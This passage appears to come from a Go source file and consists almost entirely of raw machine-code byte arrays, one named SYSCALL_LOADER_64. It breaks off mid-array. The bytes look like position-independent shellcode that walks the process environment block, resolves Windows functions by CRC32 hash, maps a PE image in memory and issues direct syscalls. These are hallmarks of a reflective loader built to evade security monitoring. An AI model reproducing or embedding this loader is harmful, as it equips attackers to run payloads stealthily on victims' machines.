	0xff, 0xff, 0x80, 0x7c, 0x24, 0x2f, 0x00, 0x74, 0x0c, 0x89, 0xf8, 0x84,
	0xc0, 0xb8, 0x40, 0x00, 0x00, 0x00, 0x0f, 0x45, 0xd0, 0x8b, 0x44, 0x24,
	0x60, 0x8b, 0x4c, 0x24, 0x28, 0x03, 0x41, 0x0c, 0x89, 0x44, 0x24, 0x3c,
	0x8b, 0x41, 0x10, 0x89, 0x44, 0x24, 0x34, 0xc7, 0x44, 0x24, 0x38, 0x00,
	0x00, 0x00, 0x00, 0x8d, 0x44, 0x24, 0x38, 0x89, 0x44, 0x24, 0x10, 0x89,
	0x54, 0x24, 0x0c, 0x8d, 0x44, 0x24, 0x34, 0x89, 0x44, 0x24, 0x08, 0x8d,
	0x44, 0x24, 0x3c, 0x89, 0x44, 0x24, 0x04, 0xc7, 0x04, 0x24, 0xff, 0xff,
	0xff, 0xff, 0x68, 0x41, 0x4d, 0xde, 0x6e, 0xe8, 0xb2, 0x00, 0x00, 0x00,
	0x83, 0xc4, 0x04, 0xff, 0xd0, 0x83, 0xec, 0x14, 0x85, 0xc0, 0x0f, 0x88,
	0x17, 0xff, 0xff, 0xff, 0x83, 0xc6, 0x01, 0x83, 0xc3, 0x28, 0x0f, 0xb7,
	0x45, 0x06, 0x39, 0xf0, 0x0f, 0x8e, 0x0c, 0xff, 0xff, 0xff, 0x89, 0x5c,
	0x24, 0x28, 0x8b, 0x43, 0x24, 0x85, 0xc0, 0x74, 0xe3, 0x99, 0x83, 0xe2,
	0xc8, 0x83, 0xc2, 0x40, 0xa9, 0x00, 0x00, 0x00, 0x40, 0x0f, 0x84, 0x03,
	0xff, 0xff, 0xff, 0x85, 0xc0, 0x0f, 0x88, 0x35, 0xff, 0xff, 0xff, 0xbf,
	0x00, 0x00, 0x00, 0x00, 0xc6, 0x44, 0x24, 0x2f, 0x01, 0xba, 0x02, 0x00,
	0x00, 0x00, 0xe9, 0xf1, 0xfe, 0xff, 0xff, 0x56, 0x53, 0x83, 0xec, 0x14,
	0x8b, 0x74, 0x24, 0x20, 0x8b, 0x46, 0x3c, 0x8b, 0x94, 0x06, 0xc0, 0x00,
	0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x85, 0xd2, 0x74, 0x0d, 0x8b,
	0x5c, 0x16, 0x0c, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x85, 0xdb, 0x75, 0x21,
	0x83, 0xc4, 0x14, 0x5b, 0x5e, 0xc3, 0xc7, 0x44, 0x24, 0x08, 0x00, 0x00,
	0x00, 0x00, 0xc7, 0x44, 0x24, 0x04, 0x01, 0x00, 0x00, 0x00, 0x89, 0x34,
	0x24, 0xff, 0xd0, 0x83, 0xec, 0x0c, 0x83, 0xc3, 0x04, 0x8b, 0x03, 0x85,
	0xc0, 0x75, 0xdf, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xeb, 0xd2, 0x60, 0x89,
	0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52,
	0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0xac, 0x3c,
	0x61, 0x7c, 0x02, 0x2c, 0x20, 0xf2, 0x0f, 0x38, 0xf0, 0xf8, 0xe2, 0xf2,
	0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78,
	0xe3, 0x42, 0x01, 0xd1, 0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49,
	0x18, 0xe3, 0x34, 0x8b, 0x7d, 0xf8, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xd6,
	0xac, 0xf2, 0x0f, 0x38, 0xf0, 0xf8, 0x38, 0xe0, 0x75, 0xf6, 0x3b, 0x7d,
	0x24, 0x75, 0xe6, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c,
	0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89,
	0x44, 0x24, 0x24, 0x5b, 0x5b, 0x61, 0xc3, 0x5f, 0x5f, 0x5a, 0x8b, 0x12,
	0xeb, 0x93, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x59, 0x29, 0xf1, 0x83, 0xc1,
	0x0d, 0x89, 0xf7, 0x83, 0xef, 0x05, 0xf3, 0xaa, 0xfc, 0x89, 0xec, 0x5d,
	0xff, 0xe0,
}

var SYSCALL_LOADER_64 = []byte{
	0x5e, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x89, 0xf1, 0xe8, 0x97, 0x00, 0x00,
	0x00, 0x48, 0x89, 0xc7, 0x48, 0x89, 0xf9, 0xe8, 0xe5, 0x02, 0x00, 0x00,
	0x48, 0x89, 0xf9, 0xe8, 0x4c, 0x02, 0x00, 0x00, 0x48, 0x89, 0xf9, 0xe8,
	0xf8, 0x05, 0x00, 0x00, 0x48, 0x89, 0xf9, 0xe8, 0xa7, 0x07, 0x00, 0x00,
	0x48, 0x31, 0xc0, 0x8b, 0x47, 0x3c, 0x8b, 0x44, 0x07, 0x28, 0x48, 0x01,
	0xf8, 0xe9, 0x08, 0x09, 0x00, 0x00, 0x56, 0x57, 0x48, 0x89, 0xcf, 0x48,
	0x89, 0xd6, 0x4c, 0x89, 0xc1, 0xf3, 0xa4, 0x5f, 0x5e, 0xc3, 0x66, 0x85,
	0xd2, 0x74, 0x24, 0x49, 0x89, 0xc8, 0x0f, 0xb7, 0xd2, 0x8d, 0x42, 0xff,
	0x48, 0x8d, 0x54, 0x01, 0x01, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xf2, 0x41,
	0x0f, 0x38, 0xf0, 0x00, 0x49, 0x83, 0xc0, 0x01, 0x49, 0x39, 0xd0, 0x75,
	0xf1, 0xeb, 0x21, 0x0f, 0xb6, 0x11, 0x84, 0xd2, 0x74, 0x1b, 0x48, 0x83,
	0xc1, 0x01, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xf2, 0x0f, 0x38, 0xf0, 0xc2,
	0x48, 0x83, 0xc1, 0x01, 0x0f, 0xb6, 0x51, 0xff, 0x84, 0xd2, 0x75, 0xef,
	0xc3, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xeb, 0xf8, 0x55, 0x57, 0x56, 0x53,
	0x48, 0x83, 0xec, 0x48, 0x48, 0x89, 0xcd, 0x48, 0x63, 0x79, 0x3c, 0x48,
	0x01, 0xcf, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x81, 0x3f, 0x50, 0x45, 0x00,
	0x00, 0x0f, 0x85, 0xa7, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x44, 0x24, 0x38,
	0x00, 0x00, 0x00, 0x00, 0x8b, 0x47, 0x50, 0x48, 0x89, 0x44, 0x24, 0x30,
	0x48, 0x8d, 0x54, 0x24, 0x38, 0xc7, 0x44, 0x24, 0x28, 0x04, 0x00, 0x00,
	0x00, 0xc7, 0x44, 0x24, 0x20, 0x00, 0x30, 0x10, 0x00, 0x4c, 0x8d, 0x4c,
	0x24, 0x30, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc1, 0xff,
	0xff, 0xff, 0xff, 0x41, 0xba, 0x55, 0x7c, 0xce, 0x99, 0xe8, 0x27, 0x07,
	0x00, 0x00, 0x49, 0x89, 0xc2, 0xe8, 0xd9, 0x07, 0x00, 0x00, 0x89, 0xc2,
	0xb8, 0x00, 0x00, 0x00, 0x00, 0x85, 0xd2, 0x78, 0x51, 0x44, 0x8b, 0x47,
	0x54, 0x48, 0x89, 0xea, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0xe8, 0x14, 0xff,
	0xff, 0xff, 0x0f, 0xb7, 0x47, 0x14, 0x48, 0x8d, 0x5c, 0x07, 0x18, 0x66,
	0x83, 0x7f, 0x06, 0x00, 0x74, 0x2b, 0xbe, 0x00, 0x00, 0x00, 0x00, 0x8b,
	0x4b, 0x0c, 0x48, 0x03, 0x4c, 0x24, 0x38, 0x8b, 0x53, 0x14, 0x48, 0x01,
	0xea, 0x44, 0x8b, 0x43, 0x10, 0xe8, 0xe8, 0xfe, 0xff, 0xff, 0x83, 0xc6,
	0x01, 0x48, 0x83, 0xc3, 0x28, 0x0f, 0xb7, 0x47, 0x06, 0x39, 0xf0, 0x7f,
	0xda, 0x48, 0x8b, 0x44, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x48, 0x5b, 0x5e,
	0x5f, 0x5d, 0xc3, 0x57, 0x48, 0x81, 0xec, 0x50, 0x02, 0x00, 0x00, 0x49,
	0x89, 0xc8, 0x48, 0xc7, 0x84, 0x24, 0x48, 0x02, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0xc7, 0x84, 0x24, 0x34, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x48, 0x8d, 0x7c, 0x24, 0x20, 0xb9, 0x41, 0x00, 0x00, 0x00, 0xb8,
	0x00, 0x00, 0x00, 0x00, 0xf3, 0x48, 0xab, 0x41, 0x80, 0x38, 0x00, 0x0f,
	0x84, 0x94, 0x00, 0x00, 0x00, 0xba, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89,
	0xd0, 0x48, 0x83, 0xc2, 0x01, 0x41, 0x80, 0x7c, 0x10, 0xff, 0x00, 0x75,
	0xf1, 0x8d, 0x14, 0x00, 0x66, 0x89, 0x94, 0x24, 0x30, 0x02, 0x00, 0x00,
	0x83, 0xc2, 0x02, 0x66, 0x89, 0x94, 0x24, 0x32, 0x02, 0x00, 0x00, 0x48,
	0x8d, 0x54, 0x24, 0x20, 0x48, 0x89, 0x94, 0x24, 0x38, 0x02, 0x00, 0x00,
	0x83, 0xe8, 0x01, 0x78, 0x15, 0x48, 0x98, 0x66, 0x41, 0x0f, 0xbe, 0x14,
	0x00, 0x66, 0x89, 0x54, 0x44, 0x20, 0x48, 0x83, 0xe8, 0x01, 0x85, 0xc0,
	0x79, 0xed, 0x4c, 0x8d, 0x8c, 0x24, 0x48, 0x02, 0x00, 0x00, 0x4c, 0x8d,
	0x84, 0x24, 0x30, 0x02, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0xb9,
	0x00, 0x00, 0x00, 0x00, 0x41, 0xba, 0xa4, 0xb9, 0xeb, 0xb4, 0xe8, 0x06,
	0x06, 0x00, 0x00, 0xff, 0xd0, 0x85, 0xc0, 0x78, 0x11, 0x48, 0x8b, 0x84,
	0x24, 0x48, 0x02, 0x00, 0x00, 0x48, 0x81, 0xc4, 0x50, 0x02, 0x00, 0x00,
	0x5f, 0xc3, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xeb, 0xf0, 0x66, 0xc7, 0x84,
	0x24, 0x30, 0x02, 0x00, 0x00, 0x00, 0x00, 0x66, 0xc7, 0x84, 0x24, 0x32,
	0x02, 0x00, 0x00, 0x02, 0x00, 0x48, 0x8d, 0x44, 0x24, 0x20, 0x48, 0x89,
	0x84, 0x24, 0x38, 0x02, 0x00, 0x00, 0xeb, 0x9a, 0x49, 0x89, 0xc9, 0x48,
	0x63, 0x51, 0x3c, 0x48, 0x01, 0xca, 0x8b, 0x82, 0xb0, 0x00, 0x00, 0x00,
	0xb9, 0x00, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x74, 0x75, 0x89, 0xc0, 0x49,
	0x8d, 0x0c, 0x01, 0x4d, 0x89, 0xca, 0x4c, 0x2b, 0x52, 0x30, 0x83, 0x39,
	0x00, 0x75, 0x4a, 0xb9, 0x01, 0x00, 0x00, 0x00, 0xeb, 0x5c, 0x8b, 0x11,
	0x44, 0x0f, 0xb7, 0x00, 0x41, 0x81, 0xe0, 0xff, 0x0f, 0x00, 0x00, 0x4c,
	0x01, 0xc2, 0x4d, 0x01, 0x14, 0x11, 0x48, 0x83, 0xc0, 0x02, 0x8b, 0x51,
	0x04, 0x48, 0x01, 0xca, 0x48, 0x39, 0xd0, 0x74, 0x18, 0x0f, 0xb6, 0x50,
	0x01, 0x41, 0x89, 0xd0, 0x41, 0x83, 0xe0, 0xf0, 0x41, 0x80, 0xf8, 0xa0,
	0x74, 0xcc, 0x80, 0xfa, 0x0f, 0x76, 0xdb, 0xeb, 0xd9, 0x48, 0x89, 0xc1,
	0x83, 0x39, 0x00, 0x74, 0x14, 0x48, 0x8d, 0x41, 0x08, 0x8b, 0x51, 0x04,
	0x48, 0x01, 0xca, 0x48, 0x39, 0xd0, 0x75, 0xd1, 0x48, 0x89, 0xd1, 0xeb,
	0xe7, 0xb9, 0x01, 0x00, 0x00, 0x00, 0x89, 0xc8, 0xc3, 0x41, 0x54, 0x55,
	0x57, 0x56, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x89, 0xcd, 0x48, 0x63,
	0x41, 0x3c, 0x8b, 0x84, 0x01, 0x90, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00,
	0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0xb0, 0x00, 0x00, 0x00, 0x89, 0xc0,
	0x4c, 0x8d, 0x24, 0x01, 0x41, 0x8b, 0x4c, 0x24, 0x0c, 0x85, 0xc9, 0x75,
	0x6a, 0xba, 0x01, 0x00, 0x00, 0x00, 0xe9, 0x97, 0x00, 0x00, 0x00, 0xba,
	0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xf9, 0xe8, 0x97, 0x00, 0x00, 0x00,
	0x48, 0x85, 0xc0, 0x74, 0x03, 0x48, 0x89, 0x06, 0x48, 0x83, 0xc3, 0x08,
	0x48, 0x83, 0xc6, 0x08, 0x4c, 0x8b, 0x03, 0x4d, 0x85, 0xc0, 0x74, 0x2e,
	0x4d, 0x85, 0xc0, 0x78, 0xd6, 0x4a, 0x8d, 0x4c, 0x05, 0x02, 0xba, 0x00,
	0x00, 0x00, 0x00, 0xe8, 0xde, 0xfc, 0xff, 0xff, 0x89, 0xc2, 0x41, 0xb8,
	0xff, 0xff, 0xff, 0xff, 0x48, 0x89, 0xf9, 0xe8, 0x5b, 0x00, 0x00, 0x00,
	0x48, 0x85, 0xc0, 0x74, 0xc7, 0x48, 0x89, 0x06, 0xeb, 0xc2, 0x49, 0x83,
	0xc4, 0x14, 0x41, 0x8b, 0x4c, 0x24, 0x0c, 0x85, 0xc9, 0x74, 0x2b, 0x89,
	0xc9, 0x48, 0x01, 0xe9, 0xe8, 0xd2, 0xfd, 0xff, 0xff, 0x48, 0x89, 0xc7,
	0x48, 0x85, 0xc0, 0x74, 0x20, 0x41, 0x8b, 0x1c, 0x24, 0x48, 0x01, 0xeb,
	0x41, 0x8b, 0x74, 0x24, 0x10, 0x48, 0x01, 0xee, 0x4c, 0x8b, 0x03, 0x4d,
	0x85, 0xc0, 0x75, 0x9c, 0xeb, 0xc8, 0xba, 0x01, 0x00, 0x00, 0x00, 0xeb,
	0x05, 0xba, 0x00, 0x00, 0x00, 0x00, 0x89, 0xd0, 0x48, 0x83, 0xc4, 0x20,
	0x5b, 0x5e, 0x5f, 0x5d, 0x41, 0x5c, 0xc3, 0x41, 0x57, 0x41, 0x56, 0x41,
	0x55, 0x41, 0x54, 0x55, 0x57, 0x56, 0x53, 0x48, 0x81, 0xec, 0x58, 0x02,
	0x00, 0x00, 0x48, 0x89, 0xcb, 0x41, 0x89, 0xd5, 0x44, 0x89, 0xc5, 0x48,
	0x63, 0x41, 0x3c, 0x48, 0x01, 0xc8, 0x8b, 0xb0, 0x88, 0x00, 0x00, 0x00,
	0x48, 0x01, 0xce, 0x8b, 0x80, 0x8c, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24,
	0x2c, 0x44, 0x8b, 0x66, 0x20, 0x44, 0x8b, 0x76, 0x1c, 0x44, 0x8b, 0x7e,
	0x24, 0x8b, 0x46, 0x18, 0x85, 0xc0, 0x0f, 0x84, 0x97, 0x01, 0x00, 0x00,
	0x89, 0xc0, 0x48, 0x89, 0x44, 0x24, 0x20, 0xbf, 0x00, 0x00, 0x00, 0x00,
	0x49, 0x01, 0xcc, 0x41, 0x8b, 0x0c, 0xbc, 0x48, 0x01, 0xd9, 0xba, 0x00,
	0x00, 0x00, 0x00, 0xe8, 0x06, 0xfc, 0xff, 0xff, 0x39, 0xfd, 0x74, 0x1a,
	0x44, 0x39, 0xe8, 0x74, 0x15, 0x48, 0x83, 0xc7, 0x01, 0x48, 0x39, 0x7c,
	0x24, 0x20, 0x75, 0xdb, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xe9, 0x2d, 0x01,
	0x00, 0x00, 0x48, 0x8d, 0x04, 0x7b, 0x42, 0x0f, 0xb7, 0x04, 0x38, 0x48,
	0x8d, 0x04, 0x83, 0x42, 0x8b, 0x04, 0x30, 0x48, 0x01, 0xc3, 0x48, 0x39,
	0xf3, 0x0f, 0x82, 0x0d, 0x01, 0x00, 0x00, 0x8b, 0x44, 0x24, 0x2c, 0x48,
	0x01, 0xc6, 0x48, 0x39, 0xf3, 0x0f, 0x83, 0xfd, 0x00, 0x00, 0x00, 0x48,
	0xc7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x44, 0x24,
	0x38, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x7c, 0x24, 0x40, 0xb8, 0x00,
	0x00, 0x00, 0x00, 0xb9, 0x1e, 0x00, 0x00, 0x00, 0xf3, 0x48, 0xab, 0xc7,
	0x07, 0x00, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x84, 0x24, 0x40, 0x01, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x84, 0x24, 0x48, 0x01, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0xbc, 0x24, 0x50, 0x01, 0x00,
	0x00, 0xb9, 0x1e, 0x00, 0x00, 0x00, 0xf3, 0x48, 0xab, 0xc7, 0x07, 0x00,
	0x00, 0x00, 0x00, 0x80, 0x3b, 0x2e, 0x0f, 0x84, 0xb3, 0x00, 0x00, 0x00,
	0xb8, 0x01, 0x00, 0x00, 0x00, 0x49, 0x89, 0xc0, 0x48, 0x83, 0xc0, 0x01,
	0x80, 0x7c, 0x03, 0xff, 0x2e, 0x75, 0xf2, 0x44, 0x89, 0xc6, 0x48, 0x8d,
	0x4c, 0x24, 0x30, 0x48, 0x89, 0xda, 0xe8, 0x27, 0xfb, 0xff, 0xff, 0x8d,
	0x4e, 0x01, 0x48, 0x63, 0xc9, 0x48, 0x01, 0xd9, 0x80, 0x39, 0x00, 0x0f,
	0x84, 0x8e, 0x00, 0x00, 0x00, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x63,
	0xd6, 0x48, 0x01, 0xda, 0x49, 0x89, 0xc0, 0x48, 0x83, 0xc0, 0x01, 0x80,
	0x3c, 0x02, 0x00, 0x75, 0xf3, 0x48, 0x8d, 0x84, 0x24, 0x40, 0x01, 0x00,
	0x00, 0x48, 0x89, 0xca, 0x48, 0x89, 0xc1, 0xe8, 0xea, 0xfa, 0xff, 0xff,
	0x48, 0x8d, 0x4c, 0x24, 0x30, 0xe8, 0x15, 0xfc, 0xff, 0xff, 0x48, 0x89,
	0xc3, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x85, 0xdb, 0x74, 0x28, 0x48,
	0x8d, 0x8c, 0x24, 0x40, 0x01, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00,
	0xe8, 0xd1, 0xfa, 0xff, 0xff, 0x89, 0xc2, 0x41, 0xb8, 0xff, 0xff, 0xff,
	0xff, 0x48, 0x89, 0xd9, 0xe8, 0x4e, 0xfe, 0xff, 0xff, 0x48, 0x89, 0xc3,
	0x48, 0x89, 0xd8, 0x48, 0x81, 0xc4, 0x58, 0x02, 0x00, 0x00, 0x5b, 0x5e,
	0x5f, 0x5d, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0xc3, 0xbe,
	0x00, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xe9, 0x53,
	0xff, 0xff, 0xff, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xeb, 0x82, 0xb8,
	0x00, 0x00, 0x00, 0x00, 0xeb, 0xcd, 0x57, 0x56, 0x53, 0x48, 0x83, 0xec,
	0x20, 0x89, 0xce, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00,
	0x48, 0x8b, 0x40, 0x18, 0x48, 0x8d, 0x78, 0x20, 0x48, 0x8b, 0x58, 0x20,
	0x48, 0x39, 0xdf, 0x74, 0x2c, 0x0f, 0xb7, 0x53, 0x48, 0x48, 0x8b, 0x4b,
	0x50, 0xe8, 0x58, 0xfa, 0xff, 0xff, 0x39, 0xf0, 0x74, 0x0f, 0x48, 0x8b,
	0x1b, 0x48, 0x39, 0xdf, 0x75, 0xe7, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xeb,
	0x04, 0x48, 0x8b, 0x43, 0x20, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0x5e, 0x5f,
	0xc3, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xeb, 0xf1, 0x41, 0x56, 0x41, 0x55,
	0x41, 0x54, 0x55, 0x57, 0x56, 0x53, 0x48, 0x83, 0xec, 0x50, 0x48, 0x89,
	0xcd, 0x48, 0x63, 0x79, 0x3c, 0x48, 0x01, 0xcf, 0x0f, 0xb7, 0x47, 0x14,
	0x48, 0x8d, 0x5c, 0x07, 0x18, 0x48, 0xc7, 0x44, 0x24, 0x48, 0x00, 0x00,
	0x00, 0x00, 0x66, 0x83, 0x7f, 0x06, 0x00, 0x74, 0x69, 0xbe, 0x00, 0x00,
	0x00, 0x00, 0x41, 0xbc, 0x00, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x74, 0x24,
	0x40, 0x4c, 0x8d, 0x6c, 0x24, 0x48, 0xe9, 0x25, 0x01, 0x00, 0x00, 0xb9,
	0x01, 0x00, 0x00, 0x00, 0x25, 0x00, 0x00, 0x00, 0x60, 0x41, 0xb8, 0x01,
	0x00, 0x00, 0x00, 0x3d, 0x00, 0x00, 0x00, 0x60, 0x41, 0xb9, 0x20, 0x00,
	0x00, 0x00, 0xb8, 0x80, 0x00, 0x00, 0x00, 0x44, 0x0f, 0x45, 0xc8, 0xe9,
	0x8c, 0x00, 0x00, 0x00, 0x41, 0xb9, 0x20, 0x00, 0x00, 0x00, 0xe9, 0x91,
	0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xeb, 0x05, 0xb8, 0x01,
	0x00, 0x00, 0x00, 0x48, 0x83, 0xc4, 0x50, 0x5b, 0x5e, 0x5f, 0x5d, 0x41,
	0x5c, 0x41, 0x5d, 0x41, 0x5e, 0xc3, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xeb,
	0xea, 0xb9, 0x01, 0x00, 0x00, 0x00, 0x45, 0x89, 0xe0, 0x41, 0xb9, 0x10,
	0x00, 0x00, 0x00, 0xeb, 0x3f, 0x44, 0x89, 0xe1, 0xa9, 0x00, 0x00, 0x00,
	0x20, 0x74, 0x32, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x78, 0x8c,
	0x89, 0xc1, 0xc1, 0xe9, 0x1f, 0x41, 0x89, 0xc8, 0x44, 0x89, 0xe1, 0x41,
	0xb9, 0x10, 0x00, 0x00, 0x00, 0xeb, 0x19, 0xa9, 0x00, 0x00, 0x00, 0x20,
	0x0f, 0x85, 0x69, 0xff, 0xff, 0xff, 0xb9, 0x01, 0x00, 0x00, 0x00, 0x41,
	0xb9, 0x04, 0x00, 0x00, 0x00, 0x45, 0x89, 0xe0, 0x25, 0x00, 0x00, 0x00,
	0x60, 0x3d, 0x00, 0x00, 0x00, 0x60, 0x0f, 0x84, 0x74, 0xff, 0xff, 0xff,
	0x84, 0xc9, 0x74, 0x0c, 0x45, 0x84, 0xc0, 0xb8, 0x40, 0x00, 0x00, 0x00,
	0x44, 0x0f, 0x45, 0xc8, 0x8b, 0x42, 0x0c, 0x48, 0x01, 0xe8, 0x48, 0x89,
	0x44, 0x24, 0x48, 0x8b, 0x42, 0x10, 0x48, 0x89, 0x44, 0x24, 0x40, 0xc7,
	0x44, 0x24, 0x3c, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x44, 0x24, 0x3c,
	0x48, 0x89, 0x44, 0x24, 0x20, 0x4d, 0x89, 0xf0, 0x4c, 0x89, 0xea, 0x48,
	0xc7, 0xc1, 0xff, 0xff, 0xff, 0xff, 0x41, 0xba, 0x41, 0x4d, 0xde, 0x6e,
	0xe8, 0xc4, 0x00, 0x00, 0x00, 0x49, 0x89, 0xc2, 0xe8, 0x76, 0x01, 0x00,
	0x00, 0x85, 0xc0, 0x0f, 0x88, 0x22, 0xff, 0xff, 0xff, 0x83, 0xc6, 0x01,
	0x48, 0x83, 0xc3, 0x28, 0x0f, 0xb7, 0x47, 0x06, 0x39, 0xf0, 0x0f, 0x8e,
	0x16, 0xff, 0xff, 0xff, 0x48, 0x89, 0xda, 0x8b, 0x43, 0x24, 0x85, 0xc0,
	0x74, 0xe3, 0x41, 0x89, 0xc1, 0x41, 0xc1, 0xf9, 0x1f, 0x41, 0x83, 0xe1,
	0xc8, 0x41, 0x83, 0xc1, 0x40, 0xa9, 0x00, 0x00, 0x00, 0x40, 0x0f, 0x84,
	0x1d, 0xff, 0xff, 0xff, 0x85, 0xc0, 0x0f, 0x88, 0x3b, 0xff, 0xff, 0xff,
	0xa9, 0x00, 0x00, 0x00, 0x20, 0x0f, 0x85, 0xfa, 0xfe, 0xff, 0xff, 0xb9,
	0x01, 0x00, 0x00, 0x00, 0x41, 0xb9, 0x02, 0x00, 0x00, 0x00, 0xe9, 0x36,
	0xff, 0xff, 0xff, 0x56, 0x53, 0x48, 0x83, 0xec, 0x28, 0x48, 0x89, 0xce,
	0x48, 0x63, 0x41, 0x3c, 0x8b, 0x84, 0x01, 0xd0, 0x00, 0x00, 0x00, 0xba,
	0x00, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x74, 0x11, 0x89, 0xc0, 0x48, 0x8b,
	0x5c, 0x01, 0x18, 0xba, 0x01, 0x00, 0x00, 0x00, 0x48, 0x85, 0xdb, 0x75,
	0x1d, 0x89, 0xd0, 0x48, 0x83, 0xc4, 0x28, 0x5b, 0x5e, 0xc3, 0x41, 0xb8,
	0x00, 0x00, 0x00, 0x00, 0xba, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0xf1,
	0xff, 0xd0, 0x48, 0x83, 0xc3, 0x08, 0x48, 0x8b, 0x03, 0x48, 0x85, 0xc0,
	0x75, 0xe4, 0xba, 0x01, 0x00, 0x00, 0x00, 0xeb, 0xd4, 0x41, 0x51, 0x41,
	0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60,
	0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50,
	0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac,
	0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xf2, 0x44, 0x0f, 0x38, 0xf0, 0xc8,
	0xe2, 0xee, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c,
	0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x75, 0x65, 0x8b,
	0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x5a, 0x48, 0x01,
	0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0,
	0xe3, 0x49, 0x4c, 0x8b, 0x4c, 0x24, 0x08, 0x48, 0xff, 0xc9, 0x41, 0x8b,
	0x34, 0x88, 0x48, 0x01, 0xd6, 0x48, 0x31, 0xc0, 0xac, 0xf2, 0x44, 0x0f,
	0x38, 0xf0, 0xc8, 0x38, 0xe0, 0x75, 0xf2, 0x45, 0x39, 0xd1, 0x75, 0xdc,
	0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c,
	0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88,
	0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58,
	0x41, 0x59, 0xc3, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x5d,
	0xff, 0xff, 0xff, 0xe8, 0x14, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74,
	0x06, 0x49, 0x89, 0xca, 0x0f, 0x05, 0xc3, 0x4d, 0x31, 0xd2, 0x49, 0xff,
	0xca, 0x41, 0x53, 0xc3, 0x51, 0x55, 0x48, 0x89, 0xe5, 0x4c, 0x89, 0xd1,
	0x41, 0x52, 0x49, 0x83, 0xc2, 0x64, 0x4c, 0x39, 0xd1, 0x7f, 0x2a, 0x8b,
	0x01, 0xc1, 0xe0, 0x08, 0x3d, 0x00, 0x0f, 0x05, 0xc3, 0x74, 0x05, 0x48,
	0xff, 0xc1, 0xeb, 0xea, 0x41, 0x5a, 0x4c, 0x39, 0xd1, 0x7c, 0x12, 0x48,
